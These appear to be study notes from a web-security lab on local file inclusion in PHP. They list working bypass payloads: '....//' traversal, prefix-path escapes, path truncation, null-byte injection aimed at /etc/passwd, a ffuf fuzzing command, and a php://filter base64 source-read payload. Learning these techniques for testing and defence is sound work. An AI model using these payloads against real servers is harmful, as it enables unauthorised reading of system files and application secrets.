## Remove strings
```php
$language = str_replace('../', '', $_GET['language']);
```
just replace `../` with `....//` because str_replace is not recursive 

can encode with burp encoder to encode as URL 

## Approved Paths
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
if so we just use something like `./languages/../../../etc/passwd`

## Appended Extension 
server as `.php` at the end of the file 

we can just add random characters in until it is max length of 4096 or 2048 char then it might work 

```shell-session
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

```

or we can try to do a null byte injection `/etc/passwd%00`

# PHP Filter 
fuzz available PHP pages with ffuf or gobuster
```shell-session
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.58.50:34336/FUZZ.php
```

**Tip:** Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.

If its not displaying on the page because it has no html output but just source code: 
```url
php://filter/read=convert.base64-encode/resource=config
```
can try to encode it with base64

try to read yourself (`index.php`)
